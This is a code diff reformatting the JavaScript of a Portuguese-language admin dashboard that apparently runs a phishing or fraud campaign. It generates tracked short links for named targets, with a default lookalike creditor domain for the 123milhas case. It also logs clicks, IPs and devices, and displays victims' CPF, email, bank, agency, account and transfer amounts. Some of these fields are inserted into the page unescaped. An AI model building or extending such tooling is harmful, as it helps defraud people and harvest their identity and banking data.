-            } catch (error) { mostrarModal('Erro', 'Não foi possível carregar os dados', 'erro'); }
-            finally { document.getElementById('loading').classList.remove('show'); }
-        }
-
-        function renderizarTabela(transferencias) {
-            const tbody = document.getElementById('tbodyTransferencias');
-            if (!transferencias.length) { tbody.innerHTML = '<tr><td colspan="8" class="text-center text-secondary">Nenhum registro encontrado</td></tr>'; return; }
-            tbody.innerHTML = transferencias.map(t => `
+        tbody.innerHTML = transferencias
+          .map(
+            (t) => `
                 <tr onclick="verDetalhes('${t.id}')" style="cursor:pointer">
                     <td><small>${formatarData(t.data)}</small></td>
                     <td><strong>${escapeHtml(t.cliente_nome)}</strong></td>
@@ -427,63 +570,78 @@
                     <td><span class="dispositivo-badge dispositivo-${t.dispositivo_tipo}"><i class="fas fa-${t.dispositivo_tipo === 'mobile' ? 'mobile-alt' : 'desktop'}"></i> ${t.dispositivo_tipo}</span></td>
                     <td><small><code>${t.ip}</code></small></td>
                 </tr>
-            `).join('');
-        }
+            `
+          )
+          .join('')
+      }
 
-        async function verDetalhes(id) {
-            try {
-                const response = await fetch(`/api/admin/detalhe/${id}`);
-                const data = await response.json();
-                if (data.success && data.transferencia) {
-                    const t = data.transferencia;
-                    document.getElementById('modalDetalhesBody').innerHTML = `
+      async function verDetalhes(id) {
+        try {
+          const response = await fetch(`/api/admin/detalhe/${id}`)
+          const data = await response.json()
+          if (data.success && data.transferencia) {
+            const t = data.transferencia
+            document.getElementById('modalDetalhesBody').innerHTML = `
                         <div class="row"><div class="col-md-6"><strong>Cliente:</strong><br>${escapeHtml(t.nome || 'N/A')}<br>CPF: ${t.cpf || 'N/A'}<br>Email: ${t.email || 'N/A'}</div>
                         <div class="col-md-6"><strong>Dispositivo:</strong><br>Tipo: ${t.dispositivo_tipo || 'N/A'}<br>SO: ${t.dispositivo_os || 'N/A'}<br>Browser: ${t.dispositivo_browser || 'N/A'}<br>IP: ${t.ip_address || 'N/A'}</div></div>
                         <hr><div class="row"><div class="col-md-6"><strong>Dados Bancários:</strong><br>Banco: ${t.banco_nome || 'N/A'}<br>Agência: ${t.agencia || 'N/A'}<br>Conta: ${t.conta || 'N/A'}<br>Valor: ${formatarValor(t.valor)}</div>
                         <div class="col-md-6"><strong>Datas:</strong><br>Transferência: ${formatarData(t.created_at)}<br>Cadastro: ${formatarData(t.data_cadastro)}</div></div>
                         <hr><div class="row"><div class="col-12"><strong>User Agent:</strong><br><small class="text-secondary">${escapeHtml(t.user_agent || 'N/A')}</small></div></div>
-                    `;
-                    modalDetalhes.show();
-                }
-            } catch(e) { console.error(e); }
+                    `
+            modalDetalhes.show()
+          }
+        } catch (e) {
+          console.error(e)
         }
+      }
 
-        // ========== LINKS ==========
-        async function gerarLinkAleatorio() {
-            const btn = event.target;
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...';
-            btn.disabled = true;
-            try {
-                let urlDestino = document.getElementById('urlDestino').value.trim();
-                let nomeCliente = document.getElementById('nomeCliente').value.trim();
-                if (!urlDestino) urlDestino = 'https://123milhas-rj-credor.com.br/';
-                const response = await fetch('/api/admin/gerar_link', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ url: urlDestino, nome_cliente: nomeCliente })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    document.getElementById('novoLink').innerText = data.short_url;
-                    document.getElementById('novoCodigo').innerText = data.short_code;
-                    document.getElementById('resultadoLink').style.display = 'block';
-                    mostrarModal('Sucesso', `Link gerado para ${nomeCliente || 'cliente'}!`, 'sucesso');
-                    carregarLinks();
-                    document.getElementById('nomeCliente').value = '';
-                } else { mostrarModal('Erro', data.error || 'Erro ao gerar link', 'erro'); }
-            } catch (err) { mostrarModal('Erro', err.message, 'erro'); }
-            finally { btn.innerHTML = originalText; btn.disabled = false; }
+      // ========== LINKS ==========
+      async function gerarLinkAleatorio() {
+        const btn = event.target
+        const originalText = btn.innerHTML
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...'
+        btn.disabled = true
+        try {
+          let urlDestino = document.getElementById('urlDestino').value.trim()
+          let nomeCliente = document.getElementById('nomeCliente').value.trim()
+          if (!urlDestino) urlDestino = 'https://123milhas-rj-credor.com.br/'
+          const response = await fetch('/api/admin/gerar_link', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ url: urlDestino, nome_cliente: nomeCliente })
+          })
+          const data = await response.json()
+          if (data.success) {
+            document.getElementById('novoLink').innerText = data.short_url
+            document.getElementById('novoCodigo').innerText = data.short_code
+            document.getElementById('resultadoLink').style.display = 'block'
+            mostrarModal('Sucesso', `Link gerado para ${nomeCliente || 'cliente'}!`, 'sucesso')
+            carregarLinks()
+            document.getElementById('nomeCliente').value = ''
+          } else {
+            mostrarModal('Erro', data.error || 'Erro ao gerar link', 'erro')
+          }
+        } catch (err) {
+          mostrarModal('Erro', err.message, 'erro')
+        } finally {
+          btn.innerHTML = originalText
+          btn.disabled = false
         }
+      }
 
-        async function carregarLinks() {
-            try {
-                const response = await fetch('/api/admin/links');
-                const data = await response.json();
-                if (data.success) {
-                    const tbody = document.getElementById('tabelaLinks');
-                    if (!data.links.length) { tbody.innerHTML = '<tr><td colspan="6" class="text-center">Nenhum link gerado ainda</td></tr>'; return; }
-                    tbody.innerHTML = data.links.map(l => `
+      async function carregarLinks() {
+        try {
+          const response = await fetch('/api/admin/links')
+          const data = await response.json()
+          if (data.success) {
+            const tbody = document.getElementById('tabelaLinks')
+            if (!data.links.length) {
+              tbody.innerHTML = '<tr><td colspan="6" class="text-center">Nenhum link gerado ainda</td></tr>'
+              return
+            }
+            tbody.innerHTML = data.links
+              .map(
+                (l) => `
                         <tr>
                             <td><strong class="text-secondary">${escapeHtml(l.nome_cliente) || '-'}</strong></td>
                             <td><code>${l.short_code}</code></td>
@@ -492,51 +650,67 @@
                             <td><span class="badge bg-primary">${l.cliques || 0}</span></td>
                             <td><button class="btn-copy btn-sm" onclick="copiarTexto('${l.short_url}')"><i class="fas fa-copy"></i> Copiar</button></td>
                         </tr>
-                    `).join('');
-                }
-            } catch(e) { console.error(e); }
+                    `
+              )
+              .join('')
+          }
+        } catch (e) {
+          console.error(e)
         }
+      }
 
-        async function limparTodosLinks() {
-            if (confirm('⚠️ ATENÇÃO! Isso irá remover TODOS os links e cliques. Deseja continuar?')) {
-                try {
-                    const response = await fetch('/api/admin/resetar_links?confirmar=sim', { method: 'DELETE' });
-                    const data = await response.json();
-                    if (data.success) {
-                        mostrarModal('Sucesso', data.message, 'sucesso');
-                        carregarLinks();
-                        carregarEstatisticas();
-                        carregarCliques();
-                    } else { mostrarModal('Erro', data.error, 'erro'); }
-                } catch(e) { mostrarModal('Erro', e.message, 'erro'); }
+      async function limparTodosLinks() {
+        if (confirm('⚠️ ATENÇÃO! Isso irá remover TODOS os links e cliques. Deseja continuar?')) {
+          try {
+            const response = await fetch('/api/admin/resetar_links?confirmar=sim', { method: 'DELETE' })
+            const data = await response.json()
+            if (data.success) {
+              mostrarModal('Sucesso', data.message, 'sucesso')
+              carregarLinks()
+              carregarEstatisticas()
+              carregarCliques()
+            } else {
+              mostrarModal('Erro', data.error, 'erro')
             }
+          } catch (e) {
+            mostrarModal('Erro', e.message, 'erro')
+          }
         }
+      }
 
-        async function carregarEstatisticas() {
-            try {
-                const response = await fetch('/api/admin/estatisticas');
-                const data = await response.json();
-                if (data.success) {
-                    document.getElementById('campaignStats').innerHTML = `
+      async function carregarEstatisticas() {
+        try {
+          const response = await fetch('/api/admin/estatisticas')
+          const data = await response.json()
+          if (data.success) {
+            document.getElementById('campaignStats').innerHTML = `
                         <div class="col-md-3"><div style="font-size:1.8rem;color:#f05929">${data.total_links || 0}</div><small>Links Gerados</small></div>
                         <div class="col-md-3"><div style="font-size:1.8rem;color:#f05929">${data.total_cliques || 0}</div><small>Total Cliques</small></div>
                         <div class="col-md-3"><div style="font-size:1.8rem;color:#f05929">${data.total_transferencias || 0}</div><small>Transferências</small></div>
                         <div class="col-md-3"><div style="font-size:1.8rem;color:#f05929">${data.transferencias_hoje || 0}</div><small>Hoje</small></div>
-                    `;
-                }
-            } catch(e) { console.error(e); }
+                    `
+          }
+        } catch (e) {
+          console.error(e)
         }
+      }
 
-        // ========== CLIQUES ==========
-        async function carregarCliques() {
-            try {
-                const response = await fetch('/api/tracking/cliques');
-                const data = await response.json();
-                if (data.success) {
-                    document.getElementById('cliquesStats').innerHTML = `<div class="col-md-12"><div style="font-size:2rem;color:#f05929">${data.total}</div><small>Total de cliques</small></div>`;
-                    const tbody = document.getElementById('tbodyCliques');
-                    if (!data.cliques.length) { tbody.innerHTML = '<tr><td colspan="5" class="text-center">Nenhum clique registrado</td></tr>'; return; }
-                    tbody.innerHTML = data.cliques.map(c => `
+      // ========== CLIQUES ==========
+      async function carregarCliques() {
+        try {
+          const response = await fetch('/api/tracking/cliques')
+          const data = await response.json()
+          if (data.success) {
+            document.getElementById('cliquesStats').innerHTML =
+              `<div class="col-md-12"><div style="font-size:2rem;color:#f05929">${data.total}</div><small>Total de cliques</small></div>`
+            const tbody = document.getElementById('tbodyCliques')
+            if (!data.cliques.length) {
+              tbody.innerHTML = '<tr><td colspan="5" class="text-center">Nenhum clique registrado</td></tr>'
+              return
+            }
+            tbody.innerHTML = data.cliques
+              .map(
+                (c) => `
                         <tr>
                             <td><small>${formatarData(c.clicked_at)}</small></td>
                             <td><strong class="text-secondary">${escapeHtml(c.nome_cliente) || '-'}</strong></td>
@@ -544,23 +718,55 @@
                             <td><span class="dispositivo-badge dispositivo-${c.device_type}">${c.device_type || 'N/A'}</span></td>
                             <td><small><code>${c.ip_address || 'N/A'}</code></small></td>
                         </tr>
-                    `).join('');
-                }
-            } catch(e) { console.error(e); }
+                    `
+              )
+              .join('')
+          }
+        } catch (e) {
+          console.error(e)
+        }
+      }
+
+      function formatarData(data) {
+        if (!data) return 'N/A'
+
+        // Exibe exatamente como veio do backend, sem conversão
+        const dataStr = String(data)
+
+        // Se tiver formato YYYY-MM-DD HH:MM:SS, converte manualmente sem timezone
+        if (dataStr.match(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}/)) {
+          const [dataParte, horaParte] = dataStr.split(' ')
+          const [ano, mes, dia] = dataParte.split('-')
+          return `${dia}/${mes}/${ano} ${horaParte}`
         }
 
-        function formatarData(data) { if (!data) return 'N/A'; return new Date(data).toLocaleString('pt-BR'); }
-        function formatarValor(valor) { return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(valor); }
-        function formatarStatus(status) { const map = { 'pendente_verificacao': 'Pendente', 'concluido': 'Concluído', 'recusado': 'Recusado' }; return map[status] || status; }
-        function escapeHtml(str) { if (!str) return 'N/A'; const div = document.createElement('div'); div.textContent = str; return div.innerHTML; }
+        return dataStr
+      }
+      function formatarValor(valor) {
+        return new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(valor)
+      }
+      function formatarStatus(status) {
+        const map = { pendente_verificacao: 'Pendente', concluido: 'Concluído', recusado: 'Recusado' }
+        return map[status] || status
+      }
+      function escapeHtml(str) {
+        if (!str) return 'N/A'
+        const div = document.createElement('div')
+        div.textContent = str
+        return div.innerHTML
+      }
 
-        document.querySelectorAll('#filtroNome, #filtroCpf, #filtroDataInicio, #filtroDataFim, #filtroStatus').forEach(el => el.addEventListener('keypress', e => { if (e.key === 'Enter') buscarTransferencias(); }));
+      document.querySelectorAll('#filtroNome, #filtroCpf, #filtroDataInicio, #filtroDataFim, #filtroStatus').forEach((el) =>
+        el.addEventListener('keypress', (e) => {
+          if (e.key === 'Enter') buscarTransferencias()
+        })
+      )
 
-        buscarTransferencias();
-        carregarEstatisticas();
-        carregarLinks();
-        carregarCliques();
-        setInterval(carregarCliques, 10000);
+      buscarTransferencias()
+      carregarEstatisticas()
+      carregarLinks()
+      carregarCliques()
+      setInterval(carregarCliques, 10000)
     </script>
-</body>
+  </body>
 </html>
